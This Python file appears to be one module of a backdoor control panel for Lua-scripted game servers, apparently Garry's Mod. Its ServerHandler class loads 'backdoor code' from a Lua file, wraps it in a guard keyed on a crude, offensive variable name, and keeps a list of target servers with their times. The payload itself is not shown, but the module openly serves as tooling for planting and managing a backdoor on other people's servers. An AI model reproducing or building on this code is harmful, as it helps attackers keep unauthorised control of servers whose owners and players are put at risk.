"""Server Handling Routines"""


class ServerHandler():
    """Class ServerHandler"""

    def __init__(self):
        """Constructor"""
        self.servers = {}
        self.server_time = {}
        self.current_server = "nil"

    def get_header(self):
        """Get main LUA code"""
        try:
            backdoor_code = open('./includes/memes.lua', 'r').read()
            return "if not rape then\n"+backdoor_code+"\nend\n"
        except:
            print("Could not open main backdoor code! Please check your files.")
            return "nil"

    def get_current_server(self):
        """Get Current Server"""
        return self.current_server

    def set_current_server(self, server):
        """Set Current Server"""
        self.current_server = server

    def set_server_time(self, srv, time):
        """Update server CurTime"""
        self.server_time[srv] = {'curtime': time}

    def load_servers(self):
        """Load servers from saved files"""
        filepath = 'server.list'
        try:
            with open(filepath) as fpath:
                for cnt, line in enumerate(fpath):
                    if line != '\n':
                        self.servers[line.rstrip()] = []
                        self.set_server_time(line.rstrip(), 0)
                        print('[Autorun] Successful added ' +
                              line + ' to the list')
        except FileNotFoundError:
            print(
                "Error opening server list file! File doesn't exist. Creating new file.")
            file = open('server.list', 'w+')
            file.close()
        except:
            print("Error opening server list file! nil by default")
